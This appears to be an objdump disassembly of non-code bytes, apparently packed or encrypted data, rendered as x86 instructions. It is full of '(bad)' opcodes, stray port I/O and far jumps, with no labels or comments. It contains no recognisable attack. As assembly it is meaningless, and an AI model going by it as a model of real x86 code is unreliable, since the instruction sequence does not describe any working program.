  410f70:	adc    ecx,DWORD PTR [esi-0x5d]
  410f73:	pop    ds
  410f74:	or     BYTE PTR [esi-0x3f3c14e1],ch
  410f7a:	mulps  xmm7,XMMWORD PTR [esi-0x6be21ad3]
  410f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f82:	jo     0x410ff1
  410f84:	aas    
  410f85:	popf   
  410f86:	nop
  410f87:	mov    ah,0x7d
  410f89:	ins    DWORD PTR es:[edi],dx
  410f8a:	fdivr  QWORD PTR [ebp+0x5aac6367]
  410f90:	mov    cl,0x2c
  410f92:	sbb    eax,0x37ec8e09
  410f97:	inc    edx
  410f98:	cwde   
  410f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f9a:	cmp    ebp,DWORD PTR [edi-0x72]
  410f9d:	jnp    0x410f36
  410f9f:	mov    dh,0xd3
  410fa1:	sbb    BYTE PTR [ecx-0x72],dl
  410fa4:	cmp    ebx,esp
  410fa6:	adc    eax,0xfda1e569
  410fab:	jecxz  0x410fdc
  410fad:	(bad)  
  410fb1:	rol    DWORD PTR [esi],cl
  410fb3:	stos   BYTE PTR es:[edi],al
  410fb4:	pop    ebx
  410fb5:	xlat   BYTE PTR ds:[ebx]
  410fb6:	in     al,dx
  410fb7:	dec    ebx
  410fb8:	or     al,0x80
  410fba:	jnp    0x410f7a
  410fbc:	jns    0x410fe0
  410fbe:	mov    al,0x26
  410fc0:	xor    al,0x39
  410fc2:	xchg   ecx,eax
  410fc3:	sbb    al,0x4b
  410fc5:	sbb    eax,0x76ecf5c3
  410fca:	or     al,0xe9
  410fcc:	jns    0x410f92
  410fce:	nop
  410fcf:	sub    bh,BYTE PTR [edx-0x38]
  410fd2:	out    0x4a,eax
  410fd4:	ret    0x320d
  410fd7:	mov    edx,0x420cefce
  410fdc:	arpl   WORD PTR [eax+0x5d],bp
  410fdf:	inc    edx
  410fe0:	not    BYTE PTR [ebp+0xf4c7a3]
  410fe6:	add    BYTE PTR [ecx+0xc],bh
  410fe9:	call   0xd119c1f2
  410fee:	vmread DWORD PTR [ebx+0x14],edx
  410ff2:	enter  0xb8f5,0xe3
  410ff6:	out    0xc5,al
  410ff8:	sub    eax,0x4f4d6f37
  410ffd:	test   DWORD PTR [edx-0x1cf1c4e0],esp
  411003:	inc    esi
  411004:	jl     0x410f92
  411006:	in     eax,dx
  411007:	rcl    BYTE PTR [ebx-0x21],cl
  41100a:	mov    eax,0x3dff7e33
  41100f:	stos   DWORD PTR es:[edi],eax
  411010:	xchg   ebx,eax
  411011:	(bad)  
  411012:	std    
  411013:	stc    
  411014:	aas    
  411015:	pop    ebp
  411016:	aaa    
  411017:	jae    0x411019
  411019:	push   0x10058f
  41101e:	ror    BYTE PTR [esi],0xb0
  411021:	inc    ecx
  411022:	or     al,0x5
  411024:	in     al,dx
  411025:	or     dh,BYTE PTR [edx-0x3a]
  411028:	scas   eax,DWORD PTR es:[edi]
  411029:	jecxz  0x411093
  41102b:	mov    ds:0x39c4d7d4,al
  411030:	inc    esi
  411031:	hlt    
  411032:	repz test al,0x67
  411035:	lods   al,BYTE PTR ds:[esi]
  411036:	mov    ebx,ss
  411038:	aas    
  411039:	std    
  41103a:	(bad)  
  41103b:	mov    eax,0xccb7b8ff
  411040:	jl     0x411000
  411042:	data16 outs dx,BYTE PTR ds:[esi]
  411044:	sbb    al,0x72
  411046:	stc    
  411047:	pop    ss
  411048:	xchg   ebx,eax
  411049:	fidivr WORD PTR [eax+edi*8]
  41104c:	loopne 0x410fe5
  41104e:	shl    dh,cl
  411050:	add    edi,DWORD PTR [ecx+esi*8]
  411053:	mov    al,BYTE PTR [edx-0x1d8d083]
  411059:	(bad)  
  41105a:	xor    DWORD PTR ds:0x2c467daf,edi
  411060:	scas   eax,DWORD PTR es:[edi]
  411061:	out    dx,al
  411062:	mov    cs,WORD PTR [ebx-0x1]
  411065:	jmp    0xb9d2:0x5e1c74b2
  41106c:	sahf   
  41106d:	sahf   
  41106e:	add    BYTE PTR [eax],ah
  411070:	mov    eax,0x5cc7ec
  411075:	into   
  411076:	rol    ah,0x9e
  411079:	fxrstor [eax]
  41107c:	in     al,dx
  41107d:	popf   
  41107e:	ficomp DWORD PTR [esi+eax*8+0x48b25d85]
  411085:	adc    ah,BYTE PTR [ebx]
  411087:	pop    ds
  411088:	sbb    BYTE PTR ds:0x4eab4b82,0x7a
  41108f:	lea    edx,[eax-0x5a0716ca]
  411095:	repz mov ds:0x4bbf9cf1,eax
  41109b:	xchg   esp,eax
  41109d:	rcr    cl,0xde
  4110a0:	inc    DWORD PTR [ecx-0x70197781]
  4110a6:	jle    0x4110d8
  4110a8:	clc    
  4110a9:	ins    DWORD PTR es:[edi],dx
  4110aa:	dec    esp
  4110ab:	or     eax,0x2999dd67
  4110b0:	add    BYTE PTR [eax-0x28],bh
  4110b3:	adc    esi,esi
  4110b5:	frstor [eax]
  4110b7:	pop    es
  4110b8:	mov    al,ds:0x93ff48d4
  4110bd:	add    DWORD PTR [esp+eiz*4+0x15bacb77],edi
  4110c4:	pextrw ebx,(bad),0xc5
  4110c6:	pushf  
  4110c7:	iret   
  4110c8:	jl     0x4110fa
  4110ca:	cmp    eax,0xd16fbee3
  4110cf:	sbb    eax,0x610ffa03
  4110d4:	loope  0x4110d5
  4110d6:	and    BYTE PTR [ebp+0x33],0x2a
  4110da:	xchg   edx,eax
  4110db:	jbe    0x411107
  4110dd:	in     eax,dx
  4110de:	stc    
  4110df:	inc    edx
  4110e0:	jp     0x411078
  4110e2:	sbb    eax,0xfbeedfb1
  4110e7:	jle    0x41107e
  4110e9:	cwde   
  4110ea:	rcr    DWORD PTR [ebp-0x33b803c9],0x7e
  4110f1:	loope  0x4110f0
  4110f3:	mov    cl,0x7e
  4110f5:	vdivss xmm7,xmm2,DWORD PTR [eax+edi*8]
  4110fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110fb:	mov    cl,0xfb
  4110fd:	(bad)  
  4110ff:	jecxz  0x411138
  411101:	lahf   
  411102:	(bad)  
  411103:	jns    0x411117
  411105:	push   0xffffffda
  411107:	sub    ebp,edx
  411109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41110a:	ret    
  41110b:	fadd   DWORD PTR [ebx-0x80]
  41110e:	xlat   BYTE PTR ds:[ebx]
  41110f:	enter  0xafe8,0x9f
  411113:	repz jo 0x411102
  411116:	aas    
  411117:	cmc    
  411118:	fnstenv [ecx-0x29]
  41111b:	mov    esi,0x6028f1e1
  411120:	add    al,BYTE PTR [eax]
  411122:	add    BYTE PTR [edx+eax*1],ah
  411125:	pop    ss
  411126:	fistp  QWORD PTR [ebx+0xe0f3d23]
  41112c:	out    dx,eax
  41112d:	lahf   
  41112e:	adc    al,0xb3
  411130:	outs   dx,DWORD PTR ds:[esi]
  411131:	push   eax
  411132:	lock sbb al,0xc8
  411135:	inc    ebp
  411136:	sbb    al,0xd6
  411138:	jp     0x411128
  41113a:	add    BYTE PTR [edx+0x5d],0xb5
  41113e:	jo     0x41112d
  411140:	rcl    BYTE PTR [eax],0x3c
  411143:	sub    DWORD PTR [eax+edx*2],esi
  411146:	mov    al,ch
  411148:	or     esp,ebx
  41114a:	mov    WORD PTR [ebx+0xd58987f],?
  411150:	loop   0x411190
  411152:	push   ss
  411153:	xchg   BYTE PTR ds:0x685bc828,bl
  411159:	lahf   
  41115a:	xchg   ecx,eax
  41115b:	rol    cl,1
  41115d:	jnp    0x4110ff
  41115f:	mov    ebp,0x9d2784c6
  411164:	inc    esi
  411166:	fidiv  WORD PTR [ebp-0x1dd3b6a1]
  41116c:	test   al,0xf9
  41116e:	cmp    eax,0xb1eab4c6
  411173:	cmp    DWORD PTR [edx],0xfffffff6
  411176:	out    dx,al
  411177:	fwait
  411178:	dec    esi
  411179:	popa   
  41117a:	shr    BYTE PTR [edi+0x38aaedfe],0xf5
  411181:	leave  
  411182:	dec    edi
  411183:	mov    ?,WORD PTR [ecx]
  411185:	aad    0x4b
  411187:	xchg   edx,eax
  411188:	icebp  
  411189:	arpl   WORD PTR ds:0xd5860005,si
  41118f:	lea    edi,[ecx]
  411191:	dec    ebx
  411192:	dec    edi
  411193:	mov    edx,DWORD PTR [ebp-0x6d]
  411196:	outs   dx,DWORD PTR ds:[esi]
  411197:	dec    esp
  411198:	and    BYTE PTR [ebx],bh
  41119a:	stos   DWORD PTR es:[edi],eax
  41119b:	pop    ss
  41119c:	jmp    0x7497:0xe66f335c
  4111a3:	push   ebp
  4111a4:	mov    cl,0x6b
  4111a6:	sbb    eax,DWORD PTR [edi+0x1d]
  4111a9:	mov    ds:0xb46a774b,eax
  4111ae:	dec    esp
  4111af:	jp     0x41119a
  4111b1:	jnp    0x411135
  4111b3:	pop    ds
  4111b4:	out    dx,eax
  4111b5:	icebp  
  4111b6:	lea    eax,[ebp+0x4d]
  4111b9:	test   eax,0xbde3eb57
  4111be:	lods   al,BYTE PTR ds:[esi]
  4111bf:	iret   
  4111c0:	push   edi
  4111c1:	mov    ?,WORD PTR [eax+0x1297c75]
  4111c7:	mov    al,ds:0x43eda27f
  4111cc:	mov    ebx,0x7ebfa8ea
  4111d1:	fcmovnb st,st(0)
  4111d3:	push   0x4dcefaef
  4111d8:	imul   ecx,DWORD PTR [edi+0x16db8ec4],0x8e3320d
  4111e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111e3:	mov    al,0x3f
  4111e5:	add    BYTE PTR [edi],cl
  4111e7:	sbb    ch,0xfa
  4111ea:	mov    ch,0x87
  4111ec:	loop   0x411182
  4111ee:	ja     0x41120c
  4111f0:	sbb    esi,DWORD PTR [ebx-0x12]
  4111f3:	pop    ebx
  4111f4:	adc    BYTE PTR [ebx-0x7aca4141],bl
  4111fa:	pop    es
  4111fb:	enter  0xe01b,0x1a
  4111ff:	sub    al,0x13
  411201:	jecxz  0x411264
  411203:	mov    al,ds:0xa6577bfa
  411208:	jnp    0x411229
  41120a:	repz (bad) 
  41120c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41120d:	es xchg esi,eax
  41120f:	jno    0x411274
  411211:	jmp    0x411280
  411213:	jmp    0x8f364ac0
  411218:	retf   0x187c
  41121b:	sahf   
  41121c:	rcl    BYTE PTR [ebx-0x59308542],0x1e
  411223:	nop
  411224:	jl     0x411254
  411226:	push   ss
  411227:	aas    
  411228:	in     eax,0x9f
  41122a:	rcl    BYTE PTR [ebx],cl
  41122c:	popf   
  41122d:	mov    bl,0x7a
  41122f:	push   cs
  411230:	pusha  
  411231:	cmc    
  411232:	outs   dx,DWORD PTR ds:[esi]
  411233:	jle    0x4111cd
  411235:	xchg   edx,eax
  411236:	ror    BYTE PTR [ebx],0xf7
  411239:	ds (bad) 
  41123c:	popf   
  41123d:	lahf   
  41123e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41123f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411240:	(bad)  [ebx-0x29]
  411243:	aaa    
  411244:	loop   0x41120c
  411246:	scas   eax,DWORD PTR es:[edi]
  411247:	ins    DWORD PTR es:[edi],dx
  411248:	dec    edi
  411249:	loopne 0x41120a
  41124b:	in     al,0xd8
  41124d:	sbb    eax,0x1f62d989
  411252:	add    edx,DWORD PTR [edx+0x8076482]
  411258:	add    eax,0x155dab12
  41125d:	imul   esp,DWORD PTR [edi+0x22],0x79f2398
  411264:	shr    BYTE PTR [edi],0xf7
  411267:	pusha  
  411268:	add    eax,0xc0677b8c
  41126d:	adc    dh,BYTE PTR [eax+0x29c16829]
  411273:	sti    
  411274:	xchg   ebx,eax
  411275:	loope  0x4112ae
  411277:	outs   dx,BYTE PTR ds:[esi]
  411278:	sahf   
  411279:	popa   
  41127a:	aam    0x60
  41127c:	add    BYTE PTR [eax],dh
  41127e:	inc    BYTE PTR ds:0xdcc7172b
  411284:	repz sahf 
  411286:	fisttp DWORD PTR [ebx]
  411288:	popf   
  411289:	dec    edi
  41128a:	jmp    0xff73:0xd2f7df29
  411291:	out    dx,al
  411292:	std    
  411293:	mov    ebx,0x3808ea31
  411298:	ds pop ebp
  41129a:	or     eax,0x95618df0
  41129f:	mov    esp,0x541c7ece
  4112a4:	adc    DWORD PTR [edi+0x29],ebx
  4112a7:	pop    ebp
  4112a8:	sar    esi,cl
  4112aa:	xchg   esp,eax
  4112ab:	and    eax,0xeeb66920
  4112b0:	mov    ch,0xe7
  4112b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112b3:	shr    DWORD PTR [edi-0x50],cl
  4112b6:	dec    BYTE PTR [edx]
  4112b8:	out    dx,eax
  4112b9:	or     al,0xda
  4112bb:	lea    ecx,[edi+ebp*1-0x4d310136]
  4112c2:	add    DWORD PTR [eax-0x40],ecx
  4112c5:	or     BYTE PTR [ecx-0x74],ah
  4112c8:	inc    eax
  4112c9:	(bad)  
  4112ca:	fstp   st(3)
  4112cc:	outs   dx,DWORD PTR ds:[esi]
  4112cd:	mov    es,WORD PTR [ebp+0x47]
  4112d0:	cmp    esp,DWORD PTR ds:0xeccf7110
  4112d7:	pop    ebp
  4112d8:	fcmovnbe st,st(2)
  4112da:	(bad)  
  4112db:	or     ah,BYTE PTR [esi+ecx*8-0x4f]
  4112df:	mov    WORD PTR [eax-0x14],?
  4112e2:	xor    ecx,esi
  4112e4:	mov    ebx,DWORD PTR [ebx-0x6b090ec2]
  4112ea:	fnstsw WORD PTR [edi-0x48]
  4112ed:	icebp  
  4112ee:	xchg   edx,eax
  4112ef:	inc    esp
  4112f0:	stc    
  4112f1:	mov    bh,0xef
  4112f3:	mov    esp,0x1b0935
  4112f8:	shr    BYTE PTR [esi+ebx*4-0xefabf62],1
  4112ff:	fmul   DWORD PTR [edx-0x49d0ceb]
  411305:	test   BYTE PTR [edi-0xe7802ee],0x68
  41130c:	cmp    esi,esi
  41130e:	in     al,dx
  41130f:	jg     0x41135d
  411311:	popa   
  411312:	or     dl,BYTE PTR [eax+0x74]
  411315:	imul   bl
  411317:	pop    edi
  411318:	xchg   ebx,eax
  411319:	push   cs
  41131a:	in     eax,0xd0
  41131c:	int    0x12
  41131e:	sbb    eax,0x5cf2671b
  411323:	pop    ebx
  411324:	mov    edi,0xaeecc09c
  411329:	stos   DWORD PTR es:[edi],eax
  41132a:	mov    edi,0xf906809d
  41132f:	or     al,0xb4
  411331:	test   DWORD PTR [edx],eax
  411333:	out    dx,eax
  411334:	dec    ebp
  411335:	xor    al,ah
  411337:	xchg   BYTE PTR [edi],ah
  411339:	lods   al,BYTE PTR ds:[esi]
  41133a:	dec    esp
  41133b:	xor    cl,ch
  41133d:	add    esp,DWORD PTR [edi+eax*2+0x40c50008]
  411344:	mov    eax,0xd2400002
  411349:	or     BYTE PTR [edx],cl
  41134b:	cmp    eax,0x298f4e7e
  411351:	in     al,dx
  411352:	mov    edi,0xf0ca6377
  411357:	arpl   WORD PTR [ecx+0x13],bp
  41135a:	pop    ecx
  41135b:	in     al,0xe5
  41135d:	addr16 std 
  41135f:	imul   ecx,edx,0xf810a09d
  411365:	adc    BYTE PTR [edx],al
  411367:	lods   al,BYTE PTR ds:[esi]
  411368:	in     al,dx
  411369:	test   DWORD PTR ds:0xc4014048,ebp
  41136f:	or     BYTE PTR [eax],al
  411371:	in     eax,dx
  411372:	out    dx,al
  411373:	lock mov BYTE PTR [ebx],ch
  411376:	dec    ebp
  411377:	dec    BYTE PTR [edi+eax*2+0x4e]
  41137b:	leave  
  41137c:	cmp    eax,0x45f0278e
  411381:	or     al,0x8f
  411383:	push   eax
  411384:	jecxz  0x411402
  411386:	jp     0x41136a
  411388:	dec    eax
  411389:	xchg   edi,eax
  41138a:	mov    WORD PTR [edi+ebx*4],?
  41138d:	mov    al,ds:0x9c0a0bab
  411392:	add    BYTE PTR fs:[ebp-0x6001fe00],dl
  411399:	shl    ebx,1
  41139b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41139c:	pop    es
  41139d:	das    
  41139e:	pop    esp
  41139f:	xchg   edi,eax
  4113a0:	xchg   edx,eax
  4113a1:	mov    edx,0xbdf31828
  4113a6:	mov    edi,0x3065a76c
  4113ab:	in     al,dx
  4113ac:	in     eax,dx
  4113ad:	clc    
  4113ae:	pop    edi
  4113af:	addr16 out dx,eax
  4113b1:	jmp    0x1c97:0xcf03d75d
  4113b8:	dec    eax
  4113b9:	retf   
  4113ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113bb:	mov    bl,dh
  4113bd:	xor    DWORD PTR [esi+0x14],edi
  4113c0:	sub    BYTE PTR [edx],0xd9
  4113c3:	and    BYTE PTR [esi],bh
  4113c5:	pop    edi
  4113c6:	jge    0x41139a
  4113c8:	rcl    BYTE PTR [esp+edx*2+0x383221c5],cl
  4113cf:	push   ebp
  4113d0:	mov    bl,BYTE PTR [ecx]
  4113d2:	je     0x4113d4
  4113d4:	add    edx,ecx
  4113d6:	ficom  DWORD PTR [ebx]
  4113d8:	push   esi
  4113d9:	(bad)  
  4113dc:	jbe    0x411393
  4113de:	cld    
  4113df:	xchg   esp,eax
  4113e0:	leave  
  4113e1:	fdiv   DWORD PTR [ecx-0x23]
  4113e4:	push   esp
  4113e5:	ins    BYTE PTR es:[edi],dx
  4113e6:	jns    0x4113e4
  4113e8:	cmp    ecx,DWORD PTR [ebx-0x53ecba59]
  4113ee:	ror    BYTE PTR [esi+0x4e],0xdf
  4113f2:	repz (bad) 
  4113f4:	fdivr  DWORD PTR [ebx-0x51e9e84d]
  4113fa:	jge    0x41146d
  4113fc:	lods   al,BYTE PTR ds:[esi]
  4113fd:	mov    ds,WORD PTR [ecx-0x4f]
  411400:	mov    ds:0xfa2f5b17,eax
  411405:	mov    edi,DWORD PTR [edi]
  411407:	mov    BYTE PTR ds:0x9a41737f,al
  41140d:	outs   dx,DWORD PTR ds:[esi]
  41140e:	test   BYTE PTR [edi-0xc39a5d0],ah
  411414:	hlt    
  411415:	repnz mov bl,ch
  411418:	rol    DWORD PTR [edx],0xe6
  41141b:	cs imul eax,edi,0xffffffec
  41141f:	mov    ebx,0x3c83db
  411424:	cmp    al,0x3d
  411426:	inc    ecx
  411427:	loopne 0x4113d9
  411429:	ret    
  41142a:	xchg   BYTE PTR [ebx],bl
  41142c:	mov    ebx,0xca067678
  411431:	(bad)  
  411432:	das    
  411433:	std    
  411434:	and    ah,BYTE PTR ds:0x71f1e132
  41143a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41143b:	(bad)  
  41143c:	jmp    0xfad7:0x7c1ecca7
  411443:	pop    ecx
  411444:	cmp    ebx,DWORD PTR [esi]
  411446:	cli    
  411447:	mov    eax,DWORD PTR [ebx-0x7a12db17]
  41144d:	(bad)  
  41144e:	mov    ebx,0x8e2de930
  411453:	mov    BYTE PTR [ebx-0x8],bh
  411456:	mov    dl,0xdb
  411458:	shl    DWORD PTR [ecx+0xff4571f],cl
  41145e:	std    
  41145f:	lock (bad) 
  411461:	fist   WORD PTR [esp+ecx*1-0x75]
  411465:	xabort 0x9e
  411468:	or     esi,eax
  41146a:	pop    ebp
  41146b:	fwait
  41146c:	and    DWORD PTR [eax+eiz*2],0xffffffd8
  411470:	dec    ebp
  411471:	pushf  
  411472:	dec    esp
  411473:	pop    ebp
  411474:	mul    cl
  411476:	dec    ebp
  411477:	adc    al,0xa0
  411479:	xchg   BYTE PTR [ecx],cl
  41147b:	mov    ch,BYTE PTR [ebx+ecx*4-0x127f7f86]
  411482:	mov    dl,0x8d
  411484:	mov    bl,0x9f
  411486:	push   ss
  411487:	or     ebx,DWORD PTR [edi-0x7c39d87]
  41148d:	cdq    
  41148e:	out    dx,eax
  41148f:	(bad)  
  411490:	xchg   edx,eax
  411491:	aas    
  411492:	sti    
  411493:	stos   DWORD PTR es:[edi],eax
  411494:	cwde   
  411495:	aas    
  411496:	ja     0x41150d
  411498:	in     al,dx
  411499:	jnp    0x411513
  41149b:	jae    0x411517
  41149d:	dec    esp
  41149e:	push   ss
  41149f:	add    al,BYTE PTR [edx+0x62]
  4114a2:	mov    ecx,cs
  4114a4:	inc    ebx
  4114a5:	scas   al,BYTE PTR es:[edi]
  4114a6:	and    ch,ah
  4114a8:	mov    edx,0x60649af6
  4114ad:	js     0x41148c
  4114af:	mov    eax,0xf3d2dffc
  4114b4:	hlt    
  4114b5:	cmp    ebx,DWORD PTR [esi-0x53c74b03]
  4114bb:	cmp    ch,BYTE PTR [ebx]
  4114bd:	sbb    DWORD PTR [edi],edi
  4114bf:	inc    eax
  4114c0:	add    bh,BYTE PTR [ecx+0xc0c4c00]
  4114c6:	add    ecx,DWORD PTR [eax]
  4114c8:	pop    ebp
  4114c9:	(bad)  
  4114cb:	int    0xd4
  4114cd:	ss or  al,0x1f
  4114d0:	pop    esi
  4114d1:	lahf   
  4114d2:	add    BYTE PTR [eax+0x3c2783dd],al
  4114d8:	outs   dx,BYTE PTR ds:[esi]
  4114d9:	pop    edi
  4114da:	int3   
  4114db:	cmp    eax,0x90095dee
  4114e0:	cwde   
  4114e1:	mov    bl,0xf8
  4114e3:	in     eax,0xd1
  4114e5:	dec    edi
  4114e6:	int    0xd6
  4114e8:	mov    eax,0x124bd5
  4114ed:	push   esi
  4114ee:	fdivrp st(6),st
  4114f0:	aas    
  4114f1:	adc    bh,BYTE PTR [ebx-0x110f86bf]
  4114f7:	mov    esp,edx
  4114f9:	pusha  
  4114fa:	repz aam 0xb4
  4114fd:	and    al,0xc8
  4114ff:	dec    ebp
  411500:	inc    eax
  411501:	add    BYTE PTR [eax],ah
  411503:	in     al,dx
  411504:	fs pushf 
  411506:	jg     0x4114e4
  411508:	mov    esi,0xf1c8f598
  41150d:	jmp    0x9e43a947
  411512:	pop    ds
  411513:	aam    0x1f
  411515:	call   DWORD PTR [ecx]
  411517:	iret   
  411518:	and    edx,DWORD PTR [edi-0x7f]
  41151b:	cmc    
  41151c:	bound  eax,QWORD PTR [edi+ebp*1+0x4797d5f7]
  411523:	jmp    0x41154e
  411525:	aaa    
  411526:	or     eax,0xf2bd490e
  41152b:	or     edi,0xcfb7f1c6
  411531:	pop    DWORD PTR [edi-0xa]
  411534:	cmp    eax,0xf69e9635
  411539:	repnz mov eax,0x1f7f07eb
  41153f:	mov    edx,DWORD PTR [esi-0x54]
  411542:	dec    ecx
  411543:	dec    ebx
  411544:	add    DWORD PTR [eax],0xb0892413
  41154a:	sbb    cl,BYTE PTR gs:[ecx+0x4c]
  41154e:	adc    al,0x0
  411550:	rcl    ah,0xb2
  411553:	mov    BYTE PTR [ebx],bh
  411555:	jbe    0x41153b
  411557:	inc    edi
  411558:	pop    esi
  411559:	jmp    0xf0cc78
  41155e:	push   0xf7d7d042
  411563:	aad    0xc8
  411565:	aad    0xdb
  411567:	mov    bh,0xec
  411569:	cmp    al,BYTE PTR [edx]
  41156b:	inc    ebp
  41156c:	and    ecx,edx
  41156e:	mov    eax,ds:0xc9c7b280
  411573:	enter  0x46f3,0xab
  411577:	cli    
  411578:	xchg   DWORD PTR [ebp+0x0],esp
  41157b:	mov    al,ds:0xef0ba4b1
  411580:	push   fs
  411582:	(bad)  
  411583:	sti    
  411584:	lods   eax,DWORD PTR ds:[esi]
  411585:	aas    
  411586:	fist   DWORD PTR [edx]
  411588:	push   edi
  411589:	jle    0x4115f7
  41158b:	cmp    ch,BYTE PTR ds:0x181362af
  411591:	jbe    0x41160b
  411593:	loop   0x41158c
  411595:	and    esi,DWORD PTR [esi-0x34]
  411598:	cmp    ah,BYTE PTR [ecx+ebx*1]
  41159b:	ds sahf 
  41159d:	sub    DWORD PTR [ecx-0x44],eax
  4115a0:	dec    edi
  4115a1:	mov    cl,BYTE PTR [ebp-0x7083ecab]
  4115a7:	fcomp  DWORD PTR [edx]
  4115a9:	mov    DWORD PTR [eax],edi
  4115ab:	mov    al,0x30
  4115ad:	lods   al,BYTE PTR ds:[esi]
  4115ae:	int3   
  4115af:	and    cl,ch
  4115b1:	jbe    0x411587
  4115b3:	add    edi,DWORD PTR [ebx+0x2bb1e762]
  4115b9:	ror    DWORD PTR [esi],cl
  4115bb:	dec    edx
  4115bc:	sub    al,0x99
  4115be:	and    DWORD PTR [ecx+0x7d],edx
  4115c1:	mov    al,0xb3
  4115c3:	sub    DWORD PTR [esi+0x236de53a],ebp
  4115c9:	ficom  WORD PTR [ecx-0x5587ec55]
  4115cf:	adc    eax,0x6fe7f54c
  4115d4:	jp     0x411653
  4115d6:	lods   al,BYTE PTR ds:[esi]
  4115d7:	sti    
  4115d8:	loop   0x41162e
  4115da:	cmp    ch,BYTE PTR [esp-0x18ca7f86]
  4115e1:	jg     0x41159f
  4115e3:	aas    
  4115e4:	in     eax,0x7a
  4115e6:	push   eax
  4115e7:	push   esi
  4115e8:	cmp    eax,0xdf762275
  4115ed:	ss popf 
  4115ef:	rcr    BYTE PTR [ebx-0x413fe10c],0x24
  4115f6:	out    dx,al
  4115f7:	cdq    
  4115f8:	popa   
  4115f9:	add    eax,0xcd85273d
  4115fe:	test   ax,0xd5de
  411602:	stos   DWORD PTR es:[edi],eax
  411603:	push   es
  411604:	daa    
  411605:	xor    DWORD PTR fs:[ecx-0x63fea375],esp
  41160c:	ficomp DWORD PTR [edx+0x1263c97]
  411612:	add    eax,0x2002df7e
  411617:	xchg   BYTE PTR [ebp+0x6834f48e],dl
  41161d:	int3   
  41161e:	in     al,0x2
  411620:	pop    eax
  411621:	js     0x4115b7
  411623:	fdivr  DWORD PTR [ebx+eiz*4+0x1f8c953e]
  41162a:	add    eax,0x7fde1a4c
  41162f:	inc    edi
  411630:	iret   
  411631:	sti    
  411632:	jecxz  0x4115e5
  411634:	pop    edi
  411635:	add    al,BYTE PTR [eax+0x1ea9fd2e]
  41163b:	sti    
  41163c:	dec    BYTE PTR [edi]
  41163e:	sub    eax,0xd83b6cbe
  411643:	pop    es
  411644:	mov    al,ds:0x8cf3fc9
  411649:	stos   DWORD PTR es:[edi],eax
  41164a:	icebp  
  41164b:	jmp    0x4115f3
  41164d:	or     DWORD PTR [esi-0x42],ecx
  411650:	add    BYTE PTR [ecx+0x3ffc147a],0xad
  411657:	xchg   DWORD PTR [esi-0x5c178079],esp
  41165d:	add    esp,ebx
  41165f:	dec    edi
  411660:	jns    0x4115e4
  411662:	pop    ecx
  411663:	sub    edx,DWORD PTR [edx+0x7c]
  411666:	or     eax,0x8fc6aacf
  41166b:	mul    DWORD PTR [esp+ebx*8+0x34d78f78]
  411672:	js     0x411688
  411674:	or     BYTE PTR [ebx],dl
  411676:	mov    BYTE PTR [ecx],0x41
  411679:	or     DWORD PTR ds:0x6e60b83c,0xffffffba
  411680:	mul    DWORD PTR [esi+0x10627d1f]
  411686:	call   ebx
  411688:	clc    
  411689:	adc    edi,edi
  41168b:	arpl   WORD PTR [edi],si
  41168d:	and    edx,esp
  41168f:	push   0x389f2394
  411694:	jecxz  0x411653
  411696:	add    DWORD PTR [edx],eax
  411698:	aaa    
  411699:	pop    esi
  41169a:	lock rcr BYTE PTR [eax-0x56622683],cl
  4116a1:	(bad)  
  4116a2:	repz into 
  4116a4:	ds cmp dh,dh
  4116a7:	push   esp
  4116a8:	inc    edi
  4116a9:	les    ecx,FWORD PTR [esi+0x799d5ccf]
  4116af:	mov    esi,0x70f92e93
  4116b4:	add    ch,BYTE PTR [edi]
  4116b6:	js     0x4116bf
  4116b8:	in     al,dx
  4116b9:	jo     0x41167f
  4116bb:	shl    ch,cl
  4116bd:	ret    0x2fc5
  4116c0:	dec    edx
  4116c1:	loopne 0x411677
  4116c3:	std    
  4116c4:	push   edi
  4116c5:	xlat   BYTE PTR ds:[ebx]
  4116c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116c8:	adc    eax,0x56293e8c
  4116cd:	dec    edi
  4116ce:	sub    DWORD PTR [eax-0x9f0679b],edi
  4116d4:	cmp    al,0xbc
  4116d6:	jg     0x4116a0
  4116d8:	adc    al,BYTE PTR [eax+0x3]
  4116db:	jno    0x41172d
  4116dd:	sub    dl,BYTE PTR [esi+0x70f61142]
  4116e3:	mov    ebx,0xb190d62a
  4116e8:	loope  0x41174d
  4116ea:	(bad)  
  4116eb:	sar    bh,cl
  4116ed:	xchg   esi,eax
  4116ee:	xchg   esi,eax
  4116ef:	xor    al,0x11
  4116f1:	dec    esi
  4116f2:	mov    al,ds:0x2cb59d2c
  4116f7:	lods   eax,DWORD PTR ds:[esi]
  4116f8:	push   ss
  4116f9:	add    ah,cl
  4116fb:	mov    al,0x5f
  4116fd:	add    ch,BYTE PTR [ebx-0x30]
  411700:	mov    DWORD PTR [ecx],edi
  411702:	std    
  411703:	cmc    
  411704:	cmp    dl,BYTE PTR fs:[ecx]
  411707:	stc    
  411708:	repnz add eax,DWORD PTR [ebx+0x6]
  41170c:	mov    al,ds:0x108f4f93
  411711:	xchg   ecx,eax
  411712:	(bad)  
  411713:	in     eax,0x9a
  411715:	shl    bl,0x8c
  411718:	jle    0x411783
  41171a:	and    ecx,DWORD PTR [edi-0x6eca7499]
  411720:	call   0xa2fbb925
  411725:	sub    eax,DWORD PTR [esi+0x55]
  411728:	(bad)  
  411729:	jnp    0x411747
  41172b:	xchg   esi,eax
  41172c:	xor    ebx,ebp
  41172e:	dec    ecx
  41172f:	dec    ebx
  411730:	xor    ah,BYTE PTR ds:0xa7601004
  411736:	and    eax,0xc5f88112
  41173b:	sub    BYTE PTR [ebx+eiz*4],bl
  41173e:	lea    ebp,[ebp-0x3bcc672a]
  411744:	hlt    
  411745:	js     0x41174d
  411747:	add    BYTE PTR [esi+0x11],bl
  41174a:	fwait
